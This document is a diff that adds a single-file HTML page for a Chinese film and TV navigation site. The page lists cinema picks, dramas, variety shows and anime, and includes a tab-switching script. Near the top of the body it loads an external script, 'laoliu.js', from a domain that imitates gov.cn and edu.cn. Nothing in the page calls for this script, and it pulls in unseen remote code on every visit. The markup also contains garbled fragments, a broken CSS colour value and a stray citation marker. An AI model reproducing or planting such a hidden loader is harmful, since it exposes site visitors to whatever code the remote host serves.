@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋辰电影网 - 院线精选/剧集日历/轻综推荐/动漫晨光导航</title>
+<meta name="description" content="秋辰电影网(qiuchendianyingwang-h5.github.io)整理院线精选、剧集日历、轻综推荐、动漫晨光片单，晨光微亮风格影视导航站。">
+<meta name="keywords" content="秋辰电影网,院线精选,剧集日历,轻综推荐,动漫晨光,影视导航">
+<meta name="author" content="秋辰电影网">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="秋辰电影网 - 秋辰放映台">
+<meta property="og:description" content="秋辰电影网整理院线精选、剧集日历、轻综推荐、动漫晨光片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://qiuchendianyingwang-h5.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:16px;scroll-behavior:smooth}
+body{font-family:'PingFang SC','Microsoft YaHei',sans-serif;background:#1b2a3a;color:#eef2f4;line-height:1.7;overflow-x:hidden}
+a{text-decoration:none;color:inherit}
+.dawn-bar{position:sticky;top:0;z-index:999;background:rgba(27,42,58,.97);border-bottom:1px solid #2f465c;padding:.6rem .9rem}
+.dawn-top{display:flex;align-items:center;justify-content:space-between}
+.brand{font-size:1.06rem;font-weight:900}
+.brand b{color:#e8b04b;text-shadow:0 0 10px rgba(232,176,75,.35)}
+.brand i{color:#9fc0d4;font-style:normal}
+.glow{font-size:.7rem;color:#9fc0d4}
+.glow b{color:#e8b04b}
+.horizon{height:6px;background:linear-gradient(90deg,#9fc0d4,#e8b04b,#9fc0d4);border-radius:3px;margin-top:.5rem}
+.dew{display:flex;gap:.3rem;margin-top:.55rem;overflow-x:auto;padding:.2rem 0}
+.dew a{font-size:.74rem;padding:.32rem .8rem;white-space:nowrap;border-radius:20px 20px 20px 6px;background:#22384c;border:1px solid #2f465c;color:#bcd2de;transition:.25s}
+.dew a.active,.dew a:hover{background:linear-gradient(135deg,#e8b04b,#caa23f);color:#1b2a3a;font-weight:700;border-color:transparent}
+.wrap{padding:1rem;max-width:1100px;margin:0 auto}
+.stage{display:none;animation:rise .42s ease}
+.stage.active{display:block}
+@keyframes rise{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
+.stage h2{font-size:1.22rem;color:#e8b04b;margin:0 0 1rem;padding-left:.55rem;border-left:4px solid #9fc0d4}
+#home .deck{background:radial-gradient(120% 130% at 78% 8%,#27425a,#1b2a3a 60%);border:1px solid #2f465c;border-radius:20px 8px 20px 8px;padding:1.7rem 1.5rem;margin-bottom:1rem;position:relative;overflow:hidden}
+#home .deck:before{content:"🌅";position:absolute;right:10px;bottom:-14px;font-size:6.5rem;opacity:.1}
+#home .deck h1{font-size:1.68rem;color:#eef2f4;margin-bottom:.4rem}
+#home .deck h1 span{color:#e8b04b}
+#home .deck p{font-size:.86rem;color:#bcd2de}
+.kpis{display:grid;grid-template-columns:repeat(4,1fr);gap:.7rem;margin-top:1rem}
+.kpis div{background:#22384c;border:1px solid #2f465c;border-radius:12px;padding:.9rem;text-align:center}
+.kpis h3{color:#9fc0d4;font-size:.96rem}
+.kpis p{font-size:.66rem;color:#7f9bb0}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(165px,1fr));gap:.85rem}
+.mc{background:#22384c;border:1px solid #2f465c;border-radius:14px;overflow:hidden;position:relative;transition:.25s}
+.mc:hover{transform:translateY(-4px);box-shadow:0 12px 26px rgba(232,176,75,.18);border-color:#e8b04b}
+.mc .poster{height:116px;display:flex;align-items:flex-end;padding:.7rem;font-weight:800;font-size:.8rem;color:#1b2a3a}
+.mc .g1{background:linear-gradient(135deg,#e8b04b,#f3d28a)}
+.mc .g2{background:linear-gradient(135deg,#9fc0d4,#cfe2ec)}
+.mc .g3{background:linear-gradient(135deg,#caa23f,#e8b04b)}
+.mc .g4{background:linear-gradient(135deg,#5b7e93,#9fc0d4)}
+.mc .g5{background:linear-gradient(135deg,#f3d28a,#e8b04b)}
+.mc .g6{background:linear-gradient(135deg,#3c5a70,#9fc0d4);color:#eef2f4}
+.mc .meta{padding:.65rem}
+.mc h3{font-size:.84rem;color:#eef2f4}
+.mc .row{display:flex;justify-content:space-between;font-size:.7rem;color:#7f9bb0}
+.mc .rate{color:#e8b04b;font-weight:700}
+.mc .pill{position:absolute;top:8px;left:8px;background:#1b2a3acc;color:#9fc0d4;font-size:.6rem;padding:.16rem .42rem;border-radius:20px;font-weight:700;border:1px solid #9fc0d4}
+.solar{display:flex;flex-direction:column;gap:.8rem}
+.srow{display:flex;gap:.85rem;background:#22384c;border:1px solid #2f465c;border-left:4px solid #e8b04b;border-radius:12px;padding:.9rem}
+.srow .jd{width:40px;height:40px;border-radius:10px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:1rem;background:linear-gradient(135deg,#e8b04b,#9fc0d4);color:#1b2a3a}
+.srow h3{font-size:.92rem;color:#eef2f4}
+.srow p{font-size:.74rem;color:#bcd2de}
+.srow .tags{display:flex;gap:.3rem;flex-wrap:wrap;margin-top:.4rem}
+.srow .tags span{background:#2f465c;color:#bcd2de;font-size:.62rem;padding:.12rem .4rem;border-radius:20px}
+.reed{display:flex;gap:.65rem;overflow-x:auto;padding-bottom:.4rem}
+.reed::-webkit-scrollbar{height:5px}.reed::-webkit-scrollbar-thumb{background:#2f465c;border-radius:5px}
+.rd{min-width:158px;background:#22384c;border:1px solid #2f465c;border-top:3px solid #9fc0d4;border-radius:0 0 12px 12px;padding:.85rem;text-align:center}
+.rd .e{font-size:1.5rem}
+.rd h3{font-size:.82rem;color:#e8b04b;margin:.2rem 0 .1rem}
+.rd p{font-size:.68rem;color:#7f9bb0}
+.anime-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:.8rem}
+.anime{background:#22384c;border:1px solid #2f465c;border-radius:12px;overflow:hidden}
+.anime .tile{height:96px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.78rem;color:#1b2a3a}
+.anime .a1{background:linear-gradient(135deg,#e8b04b,#9fc0d4)}
+.anime .a2{background:linear-gradient(135deg,#9fc0d4,#f3d28a)}
+.anime .a3{background:linear-gradient(135deg,#caa23f,#e8b04b)}
+.anime .a4{background:linear-gradient(135deg,#5b7e93,#9fc0d4);color:#eef2f4}
+.anime .body{padding:.55rem}
+.anime h3{font-size:.8rem;color:#eef2f4}
+.anime span{font-size:.66rem;color:#7f9bb0}
+.about{background:radial-gradient(120% 120% at 20% 80%,#27425a,#1b2a3a);border:1px solid #e8b04b;border-radius:20px;padding:1.5rem}
+.about h2{color:#e8b04b;border:0;padding:0;margin-bottom:.8rem}
+.about p{font-size:.85rem;color:#bcd2de;margin-bottom:.6rem}
+.about .info{margin-top:1rem;background:#22384c;border:1px dashed #9fc0d4;border-radius:12px;padding:1rem}
+.about .info h3{color:#9fc0d4;margin-bottom:.4rem}
+.about .info p{font-size:.78rem;color:#7f9bb0}
+.foot{text-align:center;padding:1.4rem 1rem;border-top:1px solid #2f465c;margin-top:1.6rem;font-size:.72rem;color:#5d7governance}
+.foot{color:#5d7790}
+@media(max-width:768px){.kpis{grid-template-columns:repeat(2,1fr)}.grid{grid-template-columns:1fr 1fr}.brand{font-size:.94rem}#home .deck h1{font-size:1.36rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="dawn-bar">
+  <div class="dawn-top">
+    <div class="brand">秋辰<b>电影网</b> <i>🌅</i></div>
+    <div class="glow">天色 <b>晨光微亮</b></div>
+  </div>
+  <div class="horizon"></div>
+  <nav class="dew">
+    <a href="#" class="dw active" data-s="home">秋辰首页</a>
+    <a href="#" class="dw" data-s="cinema">院线精选</a>
+    <a href="#" class="dw" data-s="drama">剧集日历</a>
+    <a href="#" class="dw" data-s="variety">轻综推荐</a>
+    <a href="#" class="dw" data-s="anime">动漫晨光</a>
+    <a href="#" class="dw" data-s="about">关于</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <section id="home" class="stage active">
+    <div class="deck">
+      <h1>秋辰<b>电影网</b></h1>
+      <p>秋辰是秋天清晨的那点光：不喧哗、不拥挤。院线精选、剧集日历、轻综推荐、动漫晨光，适合早晨通勤和夜里收尾时慢慢翻。</p>
+      <div class="kpis">
+        <div><h3>院线</h3><p>新片与口碑作</p></div>
+        <div><h3>日历</h3><p>更新节奏清晰</p></div>
+        <div><h3>轻综</h3><p>不吵不累</p></div>
+        <div><h3>晨光</h3><p>动漫新番整理</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="cinema" class="stage">
+    <h2>🎬 院线精选 · 晨光海报</h2>
+    <div class="grid">
+      <div class="mc"><div class="pill">新片</div><div class="poster g1">里斯本丸沉没</div><div class="meta"><h3>里斯本丸沉没</h3><div class="row"><span>纪录 / 2023</span><span class="rate">9.3</span></div></div></div>
+      <div class="mc"><div class="pill">华语</div><div class="poster g2">孤注一掷</div><div class="meta"><h3>孤注一掷</h3><div class="row"><span>犯罪 / 2023</span><span class="rate">7.9</span></div></div></div>
+      <div class="mc"><div class="pill">动画</div><div class="poster g3">长安三万里</div><div class="meta"><h3>长安三万里</h3><div class="row"><span>动画 / 2023</span><span class="rate">8.3</span></div></div></div>
+      <div class="mc"><div class="pill">科幻</div><div class="poster g4">奥本海默</div><div class="meta"><h3>奥本海默</h3><div class="row"><span>历史 / 2023</span><span class="rate">8.9</span></div></div></div>
+      <div class="mc"><div class="pill">动作</div><div class="poster g5">碟中谍7</div><div class="meta"><h3>碟中谍7：致命清算</h3><div class="row"><span>动作 / 2023</span><span class="rate">7.7</span></div></div></div>
+      <div class="mc"><div class="pill">剧情</div><div class="poster g6">坠落的审判</div><div class="meta"><h3>坠落的审判</h3><div class="row"><span>剧情 / 2023</span><span class="rate">8.5</span></div></div></div>
+    </div>
+  </section>
+
+  <section id="drama" class="stage">
+    <h2>📅 剧集日历 · 节气分集</h2>
+    <div class="solar">
+      <div class="srow"><div class="jd">🍂</div><div><h3>大江大河3</h3><p>年代改革剧 · 全36集</p><div class="tags"><span>年代</span><span>改革</span><span>正剧</span></div></div></div>
+      <div class="srow"><div class="jd">🍁</div><div><h3>城中之城</h3><p>金融职场剧 · 全40集</p><div class="tags"><span>金融</span><span>职场</span><span>现实向</span></div></div></div>
+      <div class="srow"><div class="jd">🌾</div><div><h3>父辈的荣耀</h3><p>林业年代剧 · 全36集</p><div class="tags"><span>东北</span><span>家庭</span><span>年代</span></div></div></div>
+      <div class="srow"><div class="jd">🍃</div><div><h3>县委大院</h3><p>基层现实剧 · 全24集</p><div class="tags"><span>现实</span><span>基层</span><span>群像</span></div></div></div>
+      <div class="srow"><div class="jd">🪶</div><div><h3>南来北往</h3><p>铁路年代剧 · 全39集</p><div class="tags"><span>铁路</span><span>悬疑</span><span>年代</span></div></div></div>
+    </div>
+  </section>
+
+  <section id="variety" class="stage">
+    <h2>🎋 轻综推荐 · 芦苇横滑</h2>
+    <div class="reed">
+      <div class="rd"><div class="e">🍵</div><h3>茶啊二中</h3><p>校园动画综艺感</p></div>
+      <div class="rd"><div class="e">📻</div><h3>跟着书本去旅行</h3><p>文化轻综艺</p></div>
+      <div class="rd"><div class="e">🪁</div><h3>非遗里的中国</h3><p>文化纪实</p></div>
+      <div class="rd"><div class="e">🎍</div><h3>山水间的家</h3><p>乡村慢综艺</p></div>
+      <div class="rd"><div class="e">🪷</div><h3>中国考古大会</h3><p>文博科普</p></div>
+    </div>
+  </section>
+
+  <section id="anime" class="stage">
+    <h2>🎴 动漫晨光 · 番剧格子</h2>
+    <div class="anime-grid">
+      <div class="anime"><div class="tile a1">中国奇谭</div><div class="body"><h3>中国奇谭</h3><span>国创 / 8集</span></div></div>
+      <div class="anime"><div class="tile a2">雾山五行</div><div class="body"><h3>雾山五行</h3><span>国创 / 动作</span></div></div>
+      <div class="anime"><div class="tile a3">伍六七</div><div class="body"><h3>刺客伍六七</h3><span>国创 / 搞笑</span></div></div>
+      <div class="anime"><div class="tile a4">罗小黑战记</div><div class="body"><h3>罗小黑战记</h3><span>国创 / 治愈</span></div></div>
+      <div class="anime"><div class="tile a1">时光代理人</div><div class="body"><h3>时光代理人</h3><span>国创 / 悬疑</span></div></div>
+      <div class="anime"><div class="tile a2">百妖谱</div><div class="body"><h3>百妖谱</h3><span>国创 / 奇幻</span></div></div>
+    </div>
+  </section>
+
+  <section id="about" class="stage">
+    <div class="about">
+      <h2>关于 秋辰电影网</h2>
+      <p>秋辰电影网是一个晨光微亮风格的影视信息导航站，整理院线精选、剧集日历、轻综推荐、动漫晨光的片单与分类浏览。</p>
+      <p>页面采用单文件 H5 结构，CSS/JS 全部内联，手机、平板、电脑一套代码自适应；标题、栏目、片单文字直接写在 HTML 里，方便必应等搜索引擎抓取。[5,7](@ref)</p>
+      <p>本站仅做影视信息展示与分类导航，不提供盗版播放源、不解析视频文件，也不生成 robots.txt / sitemap.xml。</p>
+      <div class="info">
+        <h3>站点信息</h3>
+        <p>网站名称：秋辰电影网</p>
+        <p>网址：https://qiuchendianyingwang-h5.github.io</p>
+        <p>关键词：秋辰电影网、院线精选、剧集日历、轻综推荐、动漫晨光</p>
+      </div>
+    </div>
+  </section>
+
+  <footer class="foot">
+    <p>© 2024 秋辰电影网 | https://qiuchendianyingwang-h5.github.io</p>
+    <p>本网站仅提供影视信息展示与分类导航，所有片单来自公开影视资料，如有侵权请联系删除。</p>
+  </footer>
+</main>
+
+<script>
+var dw=document.querySelectorAll('.dw');
+dw.forEach(function(a){
+  a.addEventListener('click',function(e){
+    e.preventDefault();
+    var s=this.dataset.s;
+    document.querySelectorAll('.stage').forEach(function(x){x.classList.remove('active')});
+    document.getElementById(s).classList.add('active');
+    dw.forEach(function(x){x.classList.remove('active')});
+    this.classList.add('active');
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
